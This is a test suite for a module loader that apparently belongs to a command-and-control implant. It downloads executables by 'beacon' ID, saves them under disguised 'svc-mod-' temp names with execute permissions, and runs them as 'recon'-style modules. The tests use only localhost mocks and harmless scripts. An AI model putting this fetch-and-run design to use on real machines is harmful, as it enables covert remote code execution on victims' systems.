import { describe, it, expect, beforeAll, afterAll } from "bun:test";
import { ModuleLoader } from "../modules/ModuleLoader.ts";
import { writeFile, rm, chmod, stat } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

// ── fetchModule ────────────────────────────────────────────────────────────────

describe("ModuleLoader.fetchModule", () => {
  it("fetches a binary from the server and returns a writable path", async () => {
    const binary = new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 0x02]);

    const mockServer = Bun.serve({
      port: 0,
      fetch() {
        return new Response(binary, {
          headers: { "Content-Type": "application/octet-stream" },
        });
      },
    });

    try {
      const path = await ModuleLoader.fetchModule(
        "recon",
        `http://localhost:${mockServer.port}`,
        "test-token",
        "beacon123",
      );
      // Path should contain a random UUID, not the predictable old format
      expect(path).toContain("svc-mod-");
      expect(path).not.toContain("beacon123-recon");
      const written = await Bun.file(path).bytes();
      expect(written).toEqual(binary);
    } finally {
      mockServer.stop();
    }
  });

  it("throws on non-200 response", async () => {
    const mockServer = Bun.serve({
      port: 0,
      fetch() { return new Response("not found", { status: 404 }); },
    });

    try {
      await expect(
        ModuleLoader.fetchModule("recon", `http://localhost:${mockServer.port}`, "tok", "b1")
      ).rejects.toThrow("ModuleLoader: fetch failed: 404");
    } finally {
      mockServer.stop();
    }
  });

  it("rejects when response body exceeds max size", async () => {
    const huge = new Uint8Array(11 * 1024 * 1024);
    const mockServer = Bun.serve({
      port: 0,
      fetch() {
        return new Response(huge, {
          headers: { "Content-Type": "application/octet-stream" },
        });
      },
    });

    try {
      await expect(
        ModuleLoader.fetchModule("recon", `http://localhost:${mockServer.port}`, "tok", "b1")
      ).rejects.toThrow("exceeds max size");
    } finally {
      mockServer.stop();
    }
  });

  it("sets file permissions to 0o700", async () => {
    const binary = new Uint8Array([0x7f, 0x45]);
    const mockServer = Bun.serve({
      port: 0,
      fetch() {
        return new Response(binary, {
          headers: { "Content-Type": "application/octet-stream" },
        });
      },
    });

    try {
      const path = await ModuleLoader.fetchModule(
        "recon", `http://localhost:${mockServer.port}`, "tok", "b1"
      );
      const info = await stat(path);
      // 0o700 = 0o100700 (regular file + rwx------)
      expect(info.mode & 0o777).toBe(0o700);
    } finally {
      mockServer.stop();
    }
  });
});

// ── writePayload ──────────────────────────────────────────────────────────────

describe("ModuleLoader.writePayload", () => {
  it("writes a base64 payload to a temp file with UUID name", async () => {
    const payload = Buffer.from("hello module").toString("base64");
    const path = await ModuleLoader.writePayload(payload);
    expect(path).toContain("svc-mod-");
    expect(path).not.toContain("beacon");
    const content = await Bun.file(path).text();
    expect(content).toBe("hello module");
  });

  it("sets file permissions to 0o700", async () => {
    const payload = Buffer.from("x").toString("base64");
    const path = await ModuleLoader.writePayload(payload);
    const info = await stat(path);
    expect(info.mode & 0o777).toBe(0o700);
  });

  it("rejects when decoded payload exceeds max size", async () => {
    const hugePayload = Buffer.alloc(11 * 1024 * 1024).toString("base64");
    await expect(ModuleLoader.writePayload(hugePayload)).rejects.toThrow("exceeds max size");
  });
});

// ── runModule ─────────────────────────────────────────────────────────────────

describe("ModuleLoader.runModule", () => {
  it("captures JSON stdout and returns success", async () => {
    const scriptPath = join(tmpdir(), "svc-test-mod-ok.sh");
    await writeFile(
      scriptPath,
      '#!/bin/sh\necho \'{"status":"ok","data":"hello from module"}\'\n'
    );
    await chmod(scriptPath, 0o755);

    const result = await ModuleLoader.runModule(scriptPath, 1234);
    expect(result.success).toBe(true);
    expect(result.output).toBe("hello from module");

    await rm(scriptPath, { force: true });
  });

  it("returns failure for error status", async () => {
    const scriptPath = join(tmpdir(), "svc-test-mod-err.sh");
    await writeFile(
      scriptPath,
      '#!/bin/sh\necho \'{"status":"error","error":"something broke"}\'\n'
    );
    await chmod(scriptPath, 0o755);

    const result = await ModuleLoader.runModule(scriptPath, 1234);
    expect(result.success).toBe(false);
    expect(result.output).toBe("something broke");

    await rm(scriptPath, { force: true });
  });

  it("returns failure for non-JSON stdout", async () => {
    const scriptPath = join(tmpdir(), "svc-test-mod-bad.sh");
    await writeFile(scriptPath, '#!/bin/sh\necho "not json"\n');
    await chmod(scriptPath, 0o755);

    const result = await ModuleLoader.runModule(scriptPath, 1234);
    expect(result.success).toBe(false);
    expect(result.output).toContain("not valid JSON");

    await rm(scriptPath, { force: true });
  });

  it("injects SVC_PID into subprocess env", async () => {
    const scriptPath = join(tmpdir(), "svc-test-mod-pid.sh");
    await writeFile(
      scriptPath,
      '#!/bin/sh\nprintf \'{"status":"ok","data":"%s"}\' "$SVC_PID"\necho\n'
    );
    await chmod(scriptPath, 0o755);

    const result = await ModuleLoader.runModule(scriptPath, 9999);
    expect(result.success).toBe(true);
    expect(result.output).toBe("9999");

    await rm(scriptPath, { force: true });
  });
});
